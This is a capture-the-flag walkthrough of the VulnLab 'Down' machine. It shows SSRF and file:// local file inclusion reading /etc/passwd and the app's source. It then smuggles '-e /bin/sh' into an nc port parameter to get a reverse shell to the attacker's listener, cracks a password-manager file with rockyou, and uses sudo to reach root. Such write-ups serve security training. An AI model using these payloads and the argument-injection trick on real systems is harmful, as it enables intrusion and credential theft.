# Down

Hello Friends,

Remo is Back

In this write-up, Iâ€™ll walk through how I pwned theÂ **Down**Â machine fromÂ **VulnLab**. From initial enumeration to gaining root access, Iâ€™ll explain the key steps, tools, and techniques used to complete the box.

![image.png](../images/down-banner.png)

Letâ€™s start by scanning the machine.

```bash
sudo nmap -sC -sV -sS -O -A -oN scanned.txt -p 22,80 --min-rate=1000 10.10.80.76
```

![image.png](../images/down.png)

Now letâ€™s go and enumerate the website running on port 80

![image.png](../images/down%201.png)

The web application has a simple functionality that check if the website is down or not.

Now letâ€™s open a http server and try to request ourselves

```bash
python3 -m http.server 80
```

![image.png](../images/down%202.png)

Now letâ€™s enter our host in the application

```bash
http://10.8.5.233
```

![image.png](../images/down%203.png)

Now letâ€™s see if we go a request!

![image.png](../images/down%204.png)

and we Did!

Now letâ€™s try Server-Side Request Forgery (SSRF)

```bash
http://127.0.0.1
```

![image.png](../images/down%205.png)

Okay nice we got a response back.

Now letâ€™s try to fuzz the localhost ports using FFUF

First let us create a port wordlist

```bash
for i in {1..65535}; do echo $i >> ports.txt; done
```

![image.png](../images/down%206.png)

Now letâ€™s use FFUF

```bash
ffuf -u "http://10.10.80.76/index.php" -X POST --data "url=http://127.0.0.1:FUZZ" -w ports.txt -fw 131
```

![image.png](../images/down%207.png)

Unfortunately no luck! ðŸ˜“

Letâ€™s go back to our website and try to add the file wrapper after the valid URL

```bash
http://10.8.5.233/ file:///etc/passwd
```

![image.png](../images/down%208.png)

and we did it we have a Local File Inclusion so letâ€™s go and read the source code of the application.

```bash
http://10.8.5.233/ file:///var/www/html/index.php
```

![image.png](../images/down%209.png)

> Amazing! we got the application source code.
> 

Now letâ€™s start analysis.

```php
if ( $valid_ip && $valid_port ) {
    $rc = 255; $output = '';
    $ec = escapeshellcmd("/usr/bin/nc -vz $ip $port");
    exec($ec . " 2>&1",$output,$rc);
    echo '<div class="output" id="outputSection">'; 
```

![image.png](../images/down%2010.png)

> Notice that there is an advanced feature named expertmode this allow us to execute nc in the server terminal
> 

now letâ€™s try to abuse it

First go to the website and enable the expert mode through the expertmode GET parameter.

```bash
http://10.10.80.76/index.php?expertmode=tcp
```

![image.png](../images/down%2011.png)

notice that the design changed!

Now open a listener on your machine 

```bash
nc -nlvp 1337
```

![image.png](../images/down%2012.png)

no go back to the website and enter you IP in the IP filed and you port in the port tab and intercept the request.

![image.png](../images/down%2013.png)

Now letâ€™s intercept the request.

![image.png](../images/down%2014.png)

now in the port parameter append the following

```bash
-e /bin/sh
```

![image.png](../images/down%2015.png)

That will till the nc to execute the bash to us.

now send and go back to our listener.

![image.png](../images/down%2016.png)

now letâ€™s stable the shell

```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![image.png](../images/down%2017.png)

now press CTRL + Z

![image.png](../images/down%2018.png)

now letâ€™s enter this in the terminal

```python
stty raw -echo;fg
```

![image.png](../images/down%2019.png)

last enter this command

```python
export TERM=xterm
```

![image.png](../images/down%2020.png)

now we got full stable shell

also we got the flag yeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeah!

![image.png](../images/down%2021.png)

now letâ€™s try to get root privilege

navigate to the local user directory

```python
cd /home/aleks/.local/share/pswm
```

![image.png](../images/down%2022.png)

Notice that we found the user password manager so letâ€™s use pswm-decryptor to decrypt it.

```python
cat pswm
```

![image.png](../images/down%2023.png)

now letâ€™s run the decryptor

```python
python3 pswm-decrypt.py -f pswm -w /usr/share/wordlists/rockyou.txt 
```

![image.png](../images/down%2024.png)

notice that we decrypted the passwords and got the password for the user Aleks.

Now letâ€™s login via SSH

```python
ssh aleks@10.10.80.76
```

![image.png](../images/down%2025.png)

and we logged it! 

Now letâ€™s try to see our privileges on the machine

```python
sudo -l
```

![image.png](../images/down%2026.png)

notice that we can run everything as root!

```python
sudo su
```

![image.png](../images/down%2027.png)

now letâ€™s cd to the root directory and see the flag!

```python
cd /root;ls -las
```

![image.png](../images/down%2028.png)

Amazing I did it!

![image.png](../images/down%2029.png)

Thatâ€™s it for theÂ **Down**Â machine! This challenge was a great test of enumeration and exploitation skills. Hope you found the write-up useful.
